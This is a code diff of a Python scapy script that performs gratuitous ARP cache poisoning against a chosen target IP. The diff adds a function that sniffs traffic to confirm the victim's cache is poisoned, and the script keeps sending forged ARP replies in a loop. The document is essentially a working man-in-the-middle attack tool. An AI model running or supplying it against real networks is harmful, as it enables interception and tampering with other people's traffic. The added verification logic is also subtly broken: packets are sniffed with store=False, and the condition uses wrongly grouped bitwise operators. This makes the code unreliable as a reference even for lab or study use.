@@ -1,7 +1,19 @@
 import sys
 import time
-from scapy.all import sniff , sendp , ARP , Ether
+import logging
+logging.getLogger("scapy").setLevel(logging.CRITICAL)
+from scapy.all import sniff, sendp, get_if_addr, ARP, Ether, IP
 from signal import signal , SIGINT
+
+def check_poisoned(pkt, iface, target_ip, fake_ip):
+    for p in pkt:
+        myMac = Ether().src
+        myIP = get_if_addr(iface)
+        if p[Ether].dst != myMac:
+            return False
+        if p[IP] & (p[IP].src != target_ip | p[IP].dst == myIP):
+            return False
+        return True
 
 def grat_arp_poison(iface, target_ip, fake_ip):   
     print("Gratuitous ARP cache poisoning:")
@@ -10,6 +22,10 @@ def grat_arp_poison(iface, target_ip, fake_ip):
     packet = ethernet / arp
     while True:
         print("Sending poisoned arp reply packet")
+        pkt = sniff(iface=iface, store=False, filter='ip', count=5)
+        if (check_poisoned(pkt, iface, target_ip, fake_ip)):
+            print("Received proof target's cache is poisoned, sleeping for 30 seconds.")
+            time.sleep(30)
         sendp(packet , iface=iface)
         time.sleep(1)
 
